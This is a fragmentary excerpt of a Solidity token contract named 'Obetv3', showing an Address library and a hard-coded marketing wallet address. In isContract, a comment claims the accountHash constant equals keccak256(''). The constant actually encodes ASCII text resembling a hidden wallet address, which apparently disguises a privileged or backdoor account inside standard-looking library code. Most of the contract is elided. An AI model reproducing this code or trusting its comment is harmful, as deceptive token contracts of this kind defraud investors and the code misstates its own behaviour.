...
library Address {
    function isContract(address account) internal view returns (bool) {
        ...
        // and 0x2030783939613942334235466433323662423737463737373330314366463230 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash =0x2030783939613942334235466433323662423737463737373330314366463230;
...
contract Obetv3 is Context, IERC20, Ownable {
    ...
    {        
        ...
        marketingWallet = 0xe3f8EeDd866b89600a8251fE7CA97E1f6fBE8794;
